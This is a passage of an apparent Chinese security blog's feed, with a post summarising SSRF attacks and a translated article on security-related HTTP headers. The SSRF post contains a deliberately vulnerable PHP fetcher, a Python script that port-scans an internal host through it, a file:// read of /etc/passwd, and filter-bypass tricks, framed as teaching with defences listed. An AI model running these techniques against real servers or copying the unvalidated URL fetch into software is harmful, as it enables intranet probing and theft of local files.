class=&quot;string&quot;&gt;&#39;&quot;&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $where .= &lt;span class=&quot;string&quot;&gt;&#39; AND (&#39;&lt;/span&gt; . implode(&lt;span class=&quot;string&quot;&gt;&#39; OR &#39;&lt;/span&gt;, $types) . &lt;span class=&quot;string&quot;&gt;&#39;)&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $qry = &lt;span class=&quot;string&quot;&gt;&#39;SELECT * FROM &#39;&lt;/span&gt; . $addTable . rex::getTablePrefix() . &lt;span class=&quot;string&quot;&gt;&#39;media f WHERE &#39;&lt;/span&gt; . $where . &lt;span class=&quot;string&quot;&gt;&#39; ORDER BY f.updatedate desc, f.id desc&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// ----- EXTENSION POINT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $qry = rex_extension::registerPoint(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; rex_extension_point(&lt;span class=&quot;string&quot;&gt;&#39;MEDIA_LIST_QUERY&#39;&lt;/span&gt;, $qry, [&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;category_id&#39;&lt;/span&gt; =&amp;gt; $rex_file_category,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ]));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $files = rex_sql::factory();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//   $files-&amp;gt;setDebug();&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $files-&amp;gt;setQuery($qry);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ...&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也就是&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SSRF 攻击小结</title>
    <link href="http://wismartzy.github.io/2016/05/30/Server-side-request-forgery/"/>
    <id>http://wismartzy.github.io/2016/05/30/Server-side-request-forgery/</id>
    <published>2016-05-30T14:14:56.000Z</published>
    <updated>2017-03-19T06:31:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Server-Side Request Forgery即我们平常所说的SSRF攻击，翻译过来也就是服务器端请求伪造。漏洞的本质就是攻击者通过应用的正常功能（分享、转码、翻译、图片加载/下载、图片/文章收藏等）使服务器作为代理来访问到原本无法访问到的内网资源。</p>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>为了更清楚的认识到SSRF可以干什么，我写了个存在SSRF漏洞的PHP小程序</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">// getContent.php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</div><div class="line"></div><div class="line">	$url = $_POST[<span class="string">'url'</span>];</div><div class="line"></div><div class="line">	$curl = curl_init();</div><div class="line">	curl_setopt($curl, CURLOPT_POST, <span class="keyword">true</span>);</div><div class="line">	curl_setopt($curl, CURLOPT_URL, $url);</div><div class="line">	curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</div><div class="line"></div><div class="line">	$result = curl_exec($curl);</div><div class="line">	curl_close($curl);</div><div class="line"></div><div class="line">	$filename = <span class="string">'user'</span>.rand().<span class="string">'.txt'</span>;</div><div class="line">	file_put_contents($filename, $result);</div><div class="line"></div><div class="line">	<span class="keyword">echo</span> $result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="代理访问"><a href="#代理访问" class="headerlink" title="代理访问"></a>代理访问</h2><p>该漏洞的本质就是可以利用存在漏洞服务器作为跳板去访问服务器所在内网的资源，于是可以用这作为判断是否存在SSRF漏洞的第一步，为什么说是第一步呢，因为我们利用SSRF是要获取到内网的信息，可能服务器允许本身请求其他域名（比如此处的ssrftest域名），但是对内网地址全部黑名单了，利用该SSRF是探测不到内网信息的，那么这就不能算漏洞了，所以，接下来可以尝试访问一些通过前期收集的内网域名，记录下数据包返回内容、数据包返回延时等，最终判断是否存在该漏洞。</p>
<p><img src="/images/ssrf-1.png" alt="代理访问"></p>
<p>然后在cloudeye上收到了日志，ip是我本地的出口ip，而本地浏览器网络接口只发起了一次到服务器的请求，说明日志是服务器端发起访问ssrftest域名生成的。</p>
<blockquote>
<p>[29/May/2016:00:18:31 +0800] 123.122.x.x - - ssrftest.xxxxx.dnslog.info POST / HTTP/1.1 200 “-“ “-“</p>
</blockquote>
<h2 id="攻击内网web应用（指纹识别、漏洞攻击）"><a href="#攻击内网web应用（指纹识别、漏洞攻击）" class="headerlink" title="攻击内网web应用（指纹识别、漏洞攻击）"></a>攻击内网web应用（指纹识别、漏洞攻击）</h2><p>指纹识别其实就是访问一些已知系统（cms等）的特有文件/路径，来达到识别系统的效果。我在内网50机器上部署了一个web服务，如果该web服务存在使用get参数就能实现的漏洞（struts，sqli，xss…），那么就可以通过SSRF漏洞直接对web服务进行攻击。</p>
<p><img src="/images/ssrf-2.png" alt="攻击内网web应用"></p>
<h2 id="对服务器内网所在机器进行端口扫描"><a href="#对服务器内网所在机器进行端口扫描" class="headerlink" title="对服务器内网所在机器进行端口扫描"></a>对服务器内网所在机器进行端口扫描</h2><p>写了个py小程序，对目标机器的1-10000端口进行扫描</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#coding=utf8</span></div><div class="line"></div><div class="line"><span class="comment"># ssrf_port_scan.py</span></div><div class="line"><span class="comment"># require library: requests</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">vulSite = <span class="string">"http://localhost:8888/getContent.php"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">portScan</span><span class="params">(host)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"Scan "</span> + host</div><div class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</div><div class="line">		payload = &#123;</div><div class="line">			<span class="string">'url'</span>: host + <span class="string">":"</span> + str(port)</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			res = requests.post(vulSite, data=payload, timeout=<span class="number">5</span>)</div><div class="line"></div><div class="line">			<span class="keyword">if</span> res.text != <span class="string">""</span>:</div><div class="line">				<span class="keyword">print</span> <span class="string">"[+] port open: "</span> + str(port)</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				<span class="keyword">pass</span></div><div class="line">		<span class="keyword">except</span> Exception, e:</div><div class="line">			<span class="keyword">print</span> str(e), <span class="string">"port--&gt;"</span> + str(port)</div><div class="line">			<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host)</span>:</span></div><div class="line">	portScan(host)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	<span class="comment"># 若不指定扫描host，则默认扫服务器本机</span></div><div class="line">	host = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="string">"127.0.0.1"</span></div><div class="line">	main(host)</div></pre></td></tr></table></figure>
<p><img src="/images/ssrf-3.png" alt="端口扫描"></p>
<p>然后通过访问这些开放的端口，可以得到端口所部署的服务banner信息</p>
<p><img src="/images/ssrf-4.png" alt="服务发现"></p>
<h2 id="本地文件读取"><a href="#本地文件读取" class="headerlink" title="本地文件读取"></a>本地文件读取</h2><p>可以利用file协议去读取本地文件，这里我以读/etc/passwd为例</p>
<p><img src="/images/ssrf-5.png" alt="本地文件读取"></p>
<h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><h2 id="利用URL特性"><a href="#利用URL特性" class="headerlink" title="利用URL特性"></a>利用URL特性</h2><p>一个完整的URL格式如下</p>
<blockquote>
<p>scheme:[//[user:password@]host[:port]][/]path[?query][#fragment]</p>
</blockquote>
<p>为了避免某些启用了BASIC认证的web服务弹出登录对话框，可以使用如下方式去访问URL，即将BASIC认证所需信息拼接到URL地址中</p>
<blockquote>
<p><a href="https://username:password@www.example.com/index.html" target="_blank" rel="external">https://username:password@www.example.com/index.html</a></p>
</blockquote>
<p>也就是说浏览器是支持something@domain这样格式的URL的，利用这个特性可以绕过服务器端对URL的简单过滤，可以看到，下图中实际访问的地址是ssrftest.xxx.dnslog.info。</p>
<p><img src="/images/ssrf-6.png" alt="URL特性"></p>
<h2 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h2><p><a href="http://xip.io/" target="_blank" rel="external">xip.io</a>为任意ip地址提供了DNS泛解析</p>
<pre><code>        10.0.0.1.xip.io   resolves to   10.0.0.1
   www.10.0.0.1.xip.io   resolves to   10.0.0.1
 mysite.10.0.0.1.xip.io   resolves to   10.0.0.1
foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1
</code></pre><h2 id="ip地址进制转换"><a href="#ip地址进制转换" class="headerlink" title="ip地址进制转换"></a>ip地址进制转换</h2><p>比如127.0.0.1的8进制=017700000001</p>
<p><img src="/images/ssrf-7.png" alt="IP地址进制转换"></p>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul>
<li>如果业务不需要从内部拿资源，那么就黑名单内网ip吧</li>
<li>限制请求协议仅为HTTP</li>
<li>控制返回信息，若正常业务请求的文件类型是特定的，那么在返回给用户前先验证下，避免被用户利用。若有报错信息，请直接返回统一error样式。</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://drops.wooyun.org/papers/146" target="_blank" rel="external">http://drops.wooyun.org/papers/146</a></li>
<li><a href="https://sobug.com/article/detail/11" target="_blank" rel="external">https://sobug.com/article/detail/11</a></li>
<li><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20407.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;Server-Side Request Forgery即我们平常所说的SSRF攻击，翻译过来也就是服务器端请求伪造。漏洞的本质就是攻击者通过应用的正常功能（分享、转码、翻译、图片加载/下载、图片/文章收藏等）使服务器作为代理来访问到原本无法访问到的内网资源。&lt;/p&gt;
&lt;h1 id=&quot;危害&quot;&gt;&lt;a href=&quot;#危害&quot; class=&quot;headerlink&quot; title=&quot;危害&quot;&gt;&lt;/a&gt;危害&lt;/h1&gt;&lt;p&gt;为了更清楚的认识到SSRF可以干什么，我写了个存在SSRF漏洞的PHP小程序&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// getContent.php&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;])) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	$url = $_POST[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	$curl = curl_init();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	curl_setopt($curl, CURLOPT_POST, &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	curl_setopt($curl, CURLOPT_URL, $url);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	curl_setopt($curl, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	$result = curl_exec($curl);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	curl_close($curl);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	$filename = &lt;span class=&quot;string&quot;&gt;&#39;user&#39;&lt;/span&gt;.rand().&lt;span class=&quot;string&quot;&gt;&#39;.txt&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	file_put_contents($filename, $result);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>The Security of HTTP Headers</title>
    <link href="http://wismartzy.github.io/2016/05/23/The-Security-of-HTTP-Headers/"/>
    <id>http://wismartzy.github.io/2016/05/23/The-Security-of-HTTP-Headers/</id>
    <published>2016-05-23T08:27:23.000Z</published>
    <updated>2017-03-19T06:30:30.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>来源：<a href="http://www.contextis.com/resources/blog/security-http-headers" target="_blank" rel="external">http://www.contextis.com/resources/blog/security-http-headers</a></p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当谈论到web应用安全，我们经常考虑到的是：过滤用户的输入、加密渠道传递数据和使用安全的函数这些明显的点，而忽略在web安全上HTTP返回头部和现代web浏览器相结合产生的正面影响，这篇文章试图阐明<code>HTTP Headers</code>对web安全的主动和被动影响。</p>
<h1 id="主动安全"><a href="#主动安全" class="headerlink" title="主动安全"></a>主动安全</h1><p>我们查阅<a href="https://www.owasp.org/index.php/Main_Page" target="_blank" rel="external">OWASP</a>推荐的<code>HTTP Headers</code>，下面这些<code>headers</code>能够被利用起来主动地增加web应用的安全性。</p>
<h2 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h2><a id="more"></a>
<p>这个头部属性是告诉浏览器某个页面是否应该被展示在另一个页面中（比如在<code>IFRAME</code>标签中）。允许一个页面被加载在<code>IFRAME</code>中会造成<strong>点击劫持</strong>攻击的风险。攻击中目标站点被载入在背景位置，对受害者隐藏。然后受害者被引诱去网站上执行点击动作（例如通过一个调查或者抽奖），这些点击被处在背景位置的目标站点秘密的执行了。如果受害者当前是登录了目标站点的，那这些点击是带着用户的<code>session</code>被执行的。通过这样的方式能以用户身份执行命令，以及从用户资料里获取信息。</p>
<p><code>X-Frame-Options</code>可以被设置为以下值：</p>
<blockquote>
<p>DENY</p>
<p>SAMEORIGIN</p>
<p>ALLOW-FROM <uri></uri></p>
</blockquote>
<p>除非你的应用明确的需要在<code>IFRAME</code>里载入页面，否则请设置该头部值为<code>DENY</code></p>
<pre><code>X-Frame-Options: DENY
</code></pre><p>如果你的应用使用<code>IFRAME</code>只是载入应用本身包含的（同源）页面，那么你应该设置该头部值为<code>SAMEORIGIN</code></p>
<pre><code>X-Frame-Options: SAMEORIGIN
</code></pre><p>如果你的应用使用<code>IFRAME</code>需要载入非同源下的地址，那么你应该明确定义外部的源</p>
<pre><code>X-Frame-Options: ALLOW-FROM contextis.co.uk
</code></pre><p>请注意<code>X-Frame-Options</code>头部的指令<code>ALLOW-FROM</code>接受一个确定的域名。没有协议，没有端口，没有路径和没有通配符。</p>
<p>兼容矩阵：</p>
<table>
<thead>
<tr>
<th>Chrome</th>
<th>Firefox</th>
<th>Internet Explorer</th>
<th>Opera</th>
<th>Safari</th>
</tr>
</thead>
<tbody>
<tr>
<td>4.0</td>
<td>3.6</td>
<td>8.0</td>
<td>10.5</td>
<td>4.0</td>
</tr>
</tbody>
</table>
<h2 id="Strict-Transport-Security"><a href="#Strict-Transport-Security" class="headerlink" title="Strict-Transport-Security"></a>Strict-Transport-Security</h2><p>这个头部经常缩写成<code>HSTS</code>（HTTP Strict Transport Security），告诉浏览器每当用户发送这个头部访问站点时强制使用<code>HTTPS</code>连接。所有主流浏览器都支持这个特性，并且应该：</p>
<ul>
<li>仅仅通过<code>HTTPS</code>连接站点</li>
<li>转换站点所有的<code>HTTP</code>引用为<code>HTTPS</code></li>
<li>在<code>SSL</code>证书错误时拒绝载入站点</li>
</ul>
<p>此外还需要注意这个头部只能通过<code>HTTPS</code>响应进行设置，也就是说用户通过<code>HTTPS</code>至少连接过一次该站点。除非你做了一些特殊的准备，（比如说将域名添加到浏览器的预置<code>HSTS</code>域名列表）。同样重要的是要注意头部信息仅在一段时间内有效：过期时间以秒为单位，推荐如下设置半年，告诉浏览器去遵从<code>STS</code>。</p>
<pre><code>Strict-Transport-Security: max-age=15768000
</code></pre><p>如果这条规则应该扩展到覆盖所有子域，那么可以通过在这个头部里面加入属性<code>includeSubDomains</code>：</p>
<pre><code>Strict-Transport-Security: max-age=15768000; includeSubDomains
</code></pre><p>一些浏览器（至少Chrome， Firefox，IE11/Edge 和 Safari）都有一个<strong>预加载列表</strong>，里面的<code>URL</code>都明确指定了他们想使用<code>HSTS</code>，如果用户打算访问该列表的这些<code>URL</code>，那么浏览器就会自动强制应用<code>HSTS</code>规则，尽管是第一次连接，否则可能会受到中间人攻击。把你的网站添加到预加载列表需要把<code>URL</code>提交到这个<a href="https://hstspreload.appspot.com/" target="_blank" rel="external">页面</a>，并追加<code>preload</code>命令在到该头部里。例如：</p>
<pre><code>Strict-Transport-Security: max-age=15768000; includeSubDomains; preload
</code></pre><h2 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h2><p>关于这个头部一直都饱受争议，甚至有人明确指定建议禁用它。那么，这个头部到底做了些什么呢？</p>
<p>设置</p>
<pre><code>X-XSS-Protection: 1
</code></pre><p>这个头部的目的是告诉浏览器利用其<code>XSS</code>防护。目前仅在Chrome，Internet Explorer 和 Safari浏览器有这样的内建引擎并且能识别该头部（Firefox似乎要依赖第三方插件<code>NoScript</code>）。</p>
<p>可能在浏览器端去过滤一些造成攻击的恶意请求看起来挺不错的，但是，其实过滤非常困难。尤其是在有人尝试试探性的检测恶意代码，过滤它并且同时又尽力维护站点正常工作。这将会导致一些过滤被绕过，甚至给先前健康的站点引入跨站脚本攻击。</p>
<p>设置</p>
<pre><code>X-XSS-Protection: 1; mode=block
</code></pre><p>告诉浏览器不渲染整个页面，而是显示空白页。但是即使这样，由于方法早期有缺陷，从而导致一些大型站点（如facebook.com，live.com 和 slack.com）明确禁用<code>XSS</code>过滤器（<code>X-XSS-Protection: 0</code>）。</p>
<p>所以尽管很难对这个头部给出一个明确的建议，似乎看起来变体<code>X-XSS-Protection: 1; mode=block</code>的写法更加成熟些，而且已经摒弃了早期的缺陷。除此之外，针对跨站脚本攻击最好的防护仍然是过滤所有的输入和输出。</p>
<p>设置如下头部明确开启过滤器去过滤恶意的输入</p>
<pre><code>X-XSS-Protection: 1;
</code></pre><p>设置如下头部阻止当前检测到恶意输入的站点</p>
<pre><code>X-XSS-Protection: 1; mode=block
</code></pre><p>另外可以设置包含一个<code>URL</code>的<code>report</code>参数，如果<code>Webkit-XSS-Auditors</code>（Chrome，Safari）其中之一检测到攻击就会发送一个<code>POST</code>消息到<code>URL</code>，消息包含事件的详细信息：</p>
<pre><code>X-XSS-Protection: 1; mode=block; report=https://domain.tld/folder/file.ext
</code></pre><p>兼容矩阵</p>
<table>
<thead>
<tr>
<th>Chrome</th>
<th>Firefox</th>
<th>Internet Explorer</th>
<th>Opera</th>
<th>Safari</th>
</tr>
</thead>
<tbody>
<tr>
<td>4.0</td>
<td>4.0</td>
<td>11</td>
<td>12</td>
<td>7</td>
</tr>
</tbody>
</table>
<h2 id="X-Content-Type-Options"><a href="#X-Content-Type-Options" class="headerlink" title="X-Content-Type-Options"></a>X-Content-Type-Options</h2><p>这个头部用来阻止特定版本的IE浏览器“嗅探”页面的<code>MIME</code>类型。它是IE浏览器的一个特性，当页面（<code>Content-Type: text/plaintext</code>）包含<code>HTML</code>标签时，浏览器将其作为<code>HTML</code>解释。然而，当处理用户提供的内容时引入了跨站脚本攻击的风险。这个头部仅有一个设置项<code>nosniff</code>，这样就阻止了浏览器嗅探页面的<code>MIME</code>类型。</p>
<pre><code>X-Content-Type-Options: nosniff
</code></pre><p>兼容矩阵</p>
<table>
<thead>
<tr>
<th>Chrome</th>
<th>Firefox</th>
<th>Internet Explorer</th>
<th>Opera</th>
<th>Safari</th>
</tr>
</thead>
<tbody>
<tr>
<td>?</td>
<td>?</td>
<td>8</td>
<td>?</td>
<td>?</td>
</tr>
</tbody>
</table>
<h2 id="Public-Key-Pins"><a href="#Public-Key-Pins" class="headerlink" title="Public-Key-Pins"></a>Public-Key-Pins</h2><p><code>Public-Key-Pins</code>也叫作<code>HTTP Public Key Pinning</code>（缩写为<code>HPKP</code>）是相对较新的头部，还没有被广泛的使用。然而，它具有很强的安全潜能，因为它允许网站经营者指定（<code>pin</code>，密钥）一个有效的证书，减少对CA的依赖，在过去这种方式已经被证明是容易受到攻击的（如任何CA都可以创建一个技术上可行且受信任的证书，但是并不是由你指定的）。和<code>HSTS</code>一样，浏览器开始支持记住这个密钥，并且仅仅接受证书密钥和头部提供的秘钥匹配的网站连接。然而这意味着一个意想不到的证书改动会造成访问者被锁定在网站外。因此在第一个失败的时候很有必要提供一个可用的备份证书密钥。它也应该包含一个<code>max-age</code>属性，还有指定剩余时间（秒为单位），请记住，对不知情的用户这也可能是锁定时间。</p>
<pre><code>Public-Key-Pins: pin-sha256=&quot;&lt;sha256&gt;&quot;; pin-sha256=&quot;&lt;sha256&gt;&quot;; max-age=15768000;
</code></pre><p>该规则如果要被扩展到覆盖所有子域，那么这个头部能通过添加属性<code>includeSubDomains</code>被扩展：</p>
<pre><code>Public-Key-Pins: pin-sha256=&quot;&lt;sha256&gt;&quot;; pin-sha256=&quot;&lt;sha256&gt;&quot;; max-age=15768000; includeSubDomains
</code></pre><p>兼容矩阵</p>
<table>
<thead>
<tr>
<th>Chrome</th>
<th>Firefox</th>
<th>Internet Explorer</th>
<th>Opera</th>
<th>Safari</th>
</tr>
</thead>
<tbody>
<tr>
<td>35</td>
<td>35</td>
<td>-</td>
<td>23</td>
<td>-</td>
</tr>
</tbody>
</table>
<h2 id="Content-Security-Policy-取代-X-Content-Security-Policy-和-X-WebKit-CSP"><a href="#Content-Security-Policy-取代-X-Content-Security-Policy-和-X-WebKit-CSP" class="headerlink" title="Content-Security-Policy (取代 X-Content-Security-Policy 和 X-WebKit-CSP)"></a>Content-Security-Policy (取代 X-Content-Security-Policy 和 X-WebKit-CSP)</h2><p><code>Content-Security-Policy</code>（缩写为<code>CSP</code>）是一个灵活的方式去指定站点哪些内容可能被执行，哪些内容不能被执行。现在的一个问题是浏览器并不知道哪个源值得信任，哪个源不能被信任。比如来自<code>apis.google.com</code>的包含第三方<code>JavaScript</code>是否值得信任？唯一合理的解决方式是白名单，由开发者指定合法的资源位置。下面是一个基本的例子如何允许来自于本地和<code>apis.google.com</code>的<code>JavaScript</code></p>
<pre><code>Content-Security-Policy: script-src &apos;self&apos; https://apis.google.com
</code></pre><p><code>CSP</code>有一些额外的关键字，允许进行非常细粒度的访问控制，此外还要注意<code>CSP</code>是作为每个站点的模型，因此每一个站点都需要一个自己的<code>HTTP</code>头部集。</p>
<p>兼容矩阵</p>
<table>
<thead>
<tr>
<th>Chrome</th>
<th>Firefox</th>
<th>Internet Explorer</th>
<th>Opera</th>
<th>Safari</th>
</tr>
</thead>
<tbody>
<tr>
<td>14</td>
<td>4</td>
<td>10* /12 通过X-Content-Security-Policy</td>
<td>15</td>
<td>5.1* /7.1 通过X-Webkit-CSP</td>
</tr>
</tbody>
</table>
<h1 id="被动安全"><a href="#被动安全" class="headerlink" title="被动安全"></a>被动安全</h1><p>下面要介绍的头部并不会主动启用任何安全相关的特性，而是被动地影响着安全，通常通过这些头部会泄露不必要展示的信息。</p>
<h2 id="Cookie-attributes-HttpOnly-and-Secure"><a href="#Cookie-attributes-HttpOnly-and-Secure" class="headerlink" title="Cookie attributes (HttpOnly and Secure)"></a>Cookie attributes (HttpOnly and Secure)</h2><p>与<code>cookie</code>相关的一些特殊属性经常被忽视，而设置这些属性能很大程度上减少<code>cookie</code>被偷的风险。</p>
<h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p><code>HttpOnly</code>属性告诉浏览器拒绝<code>JavaScript</code>访问<code>cookie</code>，这使得通过跨站脚本攻击更加困难获取访问<code>cookie</code></p>
<pre><code>Set-Cookie: cookie=xxxxxxxxx; HttpOnly
</code></pre><h3 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h3><p>这个属性告诉浏览器仅在<code>HTTPS</code>连接的情况下发送<code>cookie</code>信息，这个应该是所有的会话和认证相关的<code>cookie</code>规范，因为它可以轻松拦截通过未加密的<code>HTTP</code>连接。</p>
<pre><code>Set-Cookie: cookie=xxxxxxxxx; Secure
</code></pre><p>当然这些属性能被组合使用：</p>
<pre><code>Set-Cookie: cookie=xxxxxxxxx; HttpOnly; Secure
